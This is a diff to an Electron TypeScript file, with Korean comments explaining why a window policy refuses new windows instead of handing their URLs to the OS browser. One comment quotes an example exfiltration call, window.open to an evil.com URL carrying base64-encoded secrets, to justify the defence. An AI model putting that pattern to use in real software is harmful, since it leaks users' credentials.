@@ -52,8 +52,8 @@ export function applyWindowPolicy(window: WindowLike, opts: WindowPolicyOptions)
 
   // 새 창을 거부하는 데서 끝내고, URL을 OS 브라우저로 넘기지 않는다.
   //
-  // renderer가 고른 URL을 shell.openExternal로 전달하면 그 자체가 유출 통로가
-  // 된다: 침해된 renderer가 window.open('https://evil.com/?d=' + btoa(secrets))
+  // renderer가 고른 URL을 electron shell API로 OS 브라우저에 넘기면 그 자체가
+  // 유출 통로가 된다: 침해된 renderer가 window.open('https://evil.com/?d=' + btoa(secrets))
   // 한 줄로 자격증명을 내보낼 수 있고, CSP는 이를 막지 못한다 — window.open을
   // 덮는 디렉티브가 없다(navigate-to는 표준화되지 않았다).
   //
